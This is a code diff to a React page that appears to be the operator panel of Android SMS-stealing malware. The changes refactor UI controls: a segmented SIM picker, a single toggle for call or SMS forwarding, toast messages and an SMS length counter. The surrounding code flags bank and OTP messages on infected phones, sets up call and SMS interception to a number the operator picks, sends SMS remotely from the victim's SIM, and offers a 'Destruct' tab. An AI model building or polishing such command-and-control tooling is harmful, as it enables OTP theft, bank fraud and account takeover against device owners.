@@ -50,6 +50,8 @@ import {
 } from "@/lib/api";
 import { usePolling } from "@/lib/usePolling";
 import { classifySms } from "@/lib/smsClassifier";
+import { toast } from "@/hooks/use-toast";
+import { Loader2, Power } from "lucide-react";
 
 const TABS = [
   { id: "sms", label: "Messages", icon: MessageSquare },
@@ -59,6 +61,49 @@ const TABS = [
   { id: "data", label: "Data", icon: Database },
   { id: "delete", label: "Destruct", icon: Trash2 },
 ];
+
+/** iOS-style segmented control with a sliding thumb. */
+function Segmented<T extends string | number>({
+  options,
+  value,
+  onChange,
+}: {
+  options: { value: T; label: string }[];
+  value: T;
+  onChange: (v: T) => void;
+}) {
+  const idx = Math.max(
+    0,
+    options.findIndex((o) => o.value === value)
+  );
+  const seg = 100 / options.length;
+  return (
+    <div className="relative flex bg-muted p-1 rounded-full border border-card-border">
+      <span
+        aria-hidden
+        className="absolute top-1 bottom-1 rounded-full bg-accent shadow-[0_0_10px] shadow-accent/40 transition-all duration-200 ease-out"
+        style={{
+          left: `calc(${idx * seg}% + 4px)`,
+          width: `calc(${seg}% - 8px)`,
+        }}
+      />
+      {options.map((opt) => (
+        <button
+          key={opt.value}
+          type="button"
+          onClick={() => onChange(opt.value)}
+          className={`relative z-10 flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${
+            opt.value === value
+              ? "text-primary-foreground"
+              : "text-muted-foreground hover:text-foreground"
+          }`}
+        >
+          {opt.label}
+        </button>
+      ))}
+    </div>
+  );
+}
 
 const isBankSms = (body: string) => classifySms(body).isFinance;
 const isOtpSms = (body: string) => classifySms(body).category === "OTP";
@@ -96,6 +141,7 @@ export function DeviceDetail() {
   const [forwardNumber, setForwardNumber] = useState("");
   // Forward SIM index (0 = SIM1, 1 = SIM2) — 0-based, matches the APK.
   const [forwardSim, setForwardSim] = useState(0);
+  const [forwardBusy, setForwardBusy] = useState(false);
   // SMS-send compose box (remote SMS from panel).
   // NOTE: The APK's SmsHelper indexes the SIM list ZERO-based —
   // SIM1 = 0, SIM2 = 1. The UI shows 1/2 to the user.
@@ -221,28 +267,39 @@ export function DeviceDetail() {
     deleteSms(id, pushKey).catch(() => {});
   };
 
-  // The APK listens on clients/{id}/webhookEvent/callForward and expects:
-  //   { from: int SIM slot, to: string number, isActive: bool }
-  const handleToggleForwarding = (activate: boolean) => {
-    if (!id || !forwardNumber.trim()) {
-      alert("Enter a destination number first.");
+  // The APK listens on clients/{id}/webhookEvent/{callForward,smsForward} and
+  // expects: { from: int SIM slot, to: string number, isActive: bool }
+  // Single toggle switch: activating flips based on the live forward state.
+  const toggleForward = async () => {
+    if (!id) return;
+    if (!forwardNumber.trim()) {
+      toast({
+        title: "Forward number required",
+        description: "Enter a destination number first.",
+        variant: "destructive",
+      });
       return;
     }
-    setForward(id, "call", forwardNumber.trim(), forwardSim, activate).catch(
-      () => {}
-    );
-  };
-
-  // The APK listens on clients/{id}/webhookEvent/smsForward and expects:
-  //   { from: int SIM slot, to: string number, isActive: bool }
-  const handleToggleSmsForward = (activate: boolean) => {
-    if (!id || !forwardNumber.trim()) {
-      alert("Enter a destination number first.");
-      return;
+    const type = forwardType as "call" | "sms";
+    const active = !!(type === "call"
+      ? device?.raw.callForward?.active
+      : device?.raw.smsForward?.active);
+    setForwardBusy(true);
+    try {
+      await setForward(id, type, forwardNumber.trim(), forwardSim, !active);
+      toast({
+        title: !active ? "Forwarding enabled" : "Forwarding disabled",
+        description: `${type === "call" ? "Call" : "SMS"} fwd → ${forwardNumber.trim()} (SIM${forwardSim + 1})`,
+      });
+    } catch {
+      toast({
+        title: "Update failed",
+        description: "Could not update forwarding.",
+        variant: "destructive",
+      });
+    } finally {
+      setForwardBusy(false);
     }
-    setForward(id, "sms", forwardNumber.trim(), forwardSim, activate).catch(
-      () => {}
-    );
   };
 
   // The APK listens on clients/{id}/webhookEvent/sendSms and expects:
@@ -250,12 +307,20 @@ export function DeviceDetail() {
   const handleSendSms = async () => {
     if (!id) return;
     if (!smsTo.trim() || !smsBody.trim()) {
-      alert("Enter both number and message.");
+      toast({
+        title: "Incomplete message",
+        description: "Enter both number and message.",
+        variant: "destructive",
+      });
       return;
     }
     setSendingSms(true);
     try {
       await sendSms(id, smsTo.trim(), smsBody, smsSim);
+      toast({
+        title: "SMS sent",
+        description: `Queued to ${smsTo.trim()} via SIM${smsSim + 1}`,
+      });
       setTimeout(() => {
         setSmsTo("");
         setSmsBody("");
@@ -263,6 +328,11 @@ export function DeviceDetail() {
       }, 500);
     } catch (err) {
       console.error("sendSms error", err);
+      toast({
+        title: "Send failed",
+        description: "The device did not confirm delivery.",
+        variant: "destructive",
+      });
       setSendingSms(false);
     }
   };
@@ -312,6 +382,10 @@ export function DeviceDetail() {
 
   const isOnline = device.isOnline;
   const rawDevice = device.raw;
+  // Live forward state drives the toggle switch.
+  const forwardActive = !!(forwardType === "call"
+    ? rawDevice.callForward?.active
+    : rawDevice.smsForward?.active);
   // SMS: read from messages/{id} (new APK) — fields: sender, message, dateTime, id
   // Fall back to clients/{id}/sms (old APK) — fields: from, body, date
   const smsSortKey = (sms: any): number => {
@@ -345,6 +419,9 @@ export function DeviceDetail() {
       isBankSms(sms.message || sms.body || "")
     );
   }
+
+  // Long-SMS segmentation: 160 chars per part (GSM 7-bit)
+  const smsParts = Math.max(1, Math.ceil(smsBody.length / 160));
 
   const onlineDot = (
     <span
@@ -706,7 +783,7 @@ export function DeviceDetail() {
                     Send SMS from this device
                   </span>
                 </div>
-                <div className="grid grid-cols-1 sm:grid-cols-[1fr_90px] gap-2">
+                <div className="grid grid-cols-1 sm:grid-cols-[1fr_150px] gap-2">
                   <input
                     type="text"
                     value={smsTo}
@@ -714,17 +791,14 @@ export function DeviceDetail() {
                     placeholder="Destination number (+91...)"
                     className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                   />
-                  <div className="flex gap-1 bg-muted p-1 rounded-full border border-card-border">
-                    {[0, 1].map((idx) => (
-                      <button
-                        key={idx}
-                        onClick={() => setSmsSim(idx)}
-                        className={`flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${smsSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                      >
-                        SIM{idx + 1}
-                      </button>
-                    ))}
-                  </div>
+                  <Segmented<number>
+                    options={[
+                      { value: 0, label: "SIM 1" },
+                      { value: 1, label: "SIM 2" },
+                    ]}
+                    value={smsSim}
+                    onChange={setSmsSim}
+                  />
                 </div>
                 <textarea
                   value={smsBody}
@@ -733,6 +807,20 @@ export function DeviceDetail() {
                   rows={4}
                   className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
                 />
+                <div
+                  className={`flex items-center justify-end gap-3 text-[10px] font-mono ${
+                    smsBody.length > 1600
+                      ? "text-destructive"
+                      : smsBody.length >= 1360
+                        ? "text-warning"
+                        : "text-muted-foreground"
+                  }`}
+                >
+                  <span>{smsBody.length}/1600 chars</span>
+                  <span>
+                    {smsParts} part{smsParts > 1 ? "s" : ""}
+                  </span>
+                </div>
                 <button
                   onClick={handleSendSms}
                   disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
@@ -758,7 +846,10 @@ export function DeviceDetail() {
                 dangerIds={["delete"]}
               />
             </div>
-            <div className="flex-1 overflow-y-auto p-4 bg-background relative">
+            <div
+              key={activeTab}
+              className="flex-1 overflow-y-auto p-4 bg-background relative pane-fade"
+            >
               {activeTab === "forward" && (
                 <div
                   id="panel-forward"
@@ -783,20 +874,14 @@ export function DeviceDetail() {
                       <label className="page-eyebrow block">
                         Intercept Type
                       </label>
-                      <div className="flex gap-2 bg-muted p-1 rounded-full border border-card-border">
-                        <button
-                          onClick={() => setForwardType("call")}
-                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === "call" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                        >
-                          Call
-                        </button>
-                        <button
-                          onClick={() => setForwardType("sms")}
-                          className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardType === "sms" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                        >
-                          SMS
-                        </button>
-                      </div>
+                      <Segmented<string>
+                        options={[
+                          { value: "call", label: "Call" },
+                          { value: "sms", label: "SMS" },
+                        ]}
+                        value={forwardType}
+                        onChange={setForwardType}
+                      />
                     </div>
 
                     <div className="space-y-3">
@@ -816,39 +901,55 @@ export function DeviceDetail() {
                       <label className="page-eyebrow block">
                         Forward From SIM
                       </label>
-                      <div className="flex gap-2 bg-muted p-1 rounded-full border border-card-border">
-                        {[0, 1].map((idx) => (
-                          <button
-                            key={idx}
-                            onClick={() => setForwardSim(idx)}
-                            className={`flex-1 py-2 text-sm font-semibold rounded-full transition-colors ${forwardSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                          >
-                            SIM{idx + 1}
-                          </button>
-                        ))}
-                      </div>
+                      <Segmented<number>
+                        options={[
+                          { value: 0, label: "SIM 1" },
+                          { value: 1, label: "SIM 2" },
+                        ]}
+                        value={forwardSim}
+                        onChange={setForwardSim}
+                      />
                     </div>
 
-                    <div className="pt-2 flex gap-3">
+                    <div className="pt-2">
                       <button
-                        onClick={() =>
-                          forwardType === "call"
-                            ? handleToggleForwarding(true)
-                            : handleToggleSmsForward(true)
-                        }
-                        className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-3 rounded-full transition-colors"
+                        onClick={toggleForward}
+                        disabled={forwardBusy}
+                        className="w-full flex items-center justify-between px-4 py-3 rounded-full border border-card-border bg-card transition-all disabled:opacity-60"
                       >
-                        Activate {forwardType === "call" ? "Call" : "SMS"} Fwd
-                      </button>
-                      <button
-                        onClick={() =>
-                          forwardType === "call"
-                            ? handleToggleForwarding(false)
-                            : handleToggleSmsForward(false)
-                        }
-                        className="flex-1 bg-warning hover:bg-warning/90 text-primary-foreground font-bold py-3 rounded-full transition-colors"
-                      >
-                        Deactivate
+                        <span
+                          className={`flex items-center gap-2 text-sm font-bold ${
+                            forwardActive
+                              ? "text-accent"
+                              : "text-muted-foreground"
+                          }`}
+                        >
+                          {forwardBusy ? (
+                            <Loader2 className="w-4 h-4 animate-spin" />
+                          ) : (
+                            <Power className="w-4 h-4" />
+                          )}
+                          {forwardBusy
+                            ? "Updating…"
+                            : forwardActive
+                              ? "Forwarding Active"
+                              : "Forwarding Off"}
+                        </span>
+                        <span
+                          className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${
+                            forwardActive
+                              ? "bg-accent"
+                              : "bg-muted border border-card-border"
+                          }`}
+                        >
+                          <span
+                            className={`inline-block h-5 w-5 transform rounded-full bg-white shadow transition-transform duration-200 ${
+                              forwardActive
+                                ? "translate-x-[22px]"
+                                : "translate-x-0.5"
+                            }`}
+                          />
+                        </span>
                       </button>
                     </div>
                   </div>
